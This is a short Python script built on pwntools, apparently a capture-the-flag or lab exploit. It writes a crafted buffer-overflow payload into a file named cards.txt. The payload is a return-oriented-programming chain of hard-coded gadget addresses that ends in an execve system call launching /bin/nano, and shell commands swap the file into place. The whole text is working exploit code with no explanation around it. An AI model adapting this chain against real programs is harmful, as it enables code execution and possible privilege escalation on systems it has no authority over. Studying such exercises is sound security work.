import os
from pwn import *

heap_path = 0x80e6f60 + 39 + 16
mov_eax_0xb = 0x080901b1
xor_edx_edx = 0x0805d259
xor_ecx_ecx_int_80 = 0x0804cafb
ret_gadget = 0x0804900e


os.system("cp cards.txt.bck cards.txt")

f = open("cards.txt", "rb")
lines = f.readlines()
f.close()

f = open("payload.txt", "wb")
for line in lines[:len(lines)-1]:
    f.write(line)

f.write(b"AAA" + p32(0x80e6e30)*575 + p32(ret_gadget)[:3] + b"A"*244 +  bytes([p32(ret_gadget)[3]]) + p32(0xffffb92b) + p32(xor_edx_edx) + p32(mov_eax_0xb)[:2] + b"A"*244 + p32(mov_eax_0xb)[2:] + p32(heap_path) + b"A"*429 + p32(xor_ecx_ecx_int_80) + b"A"*371 + b"/bin/nano\x00")
f.close()

os.system("rm cards.txt")
os.system("mv payload.txt cards.txt")
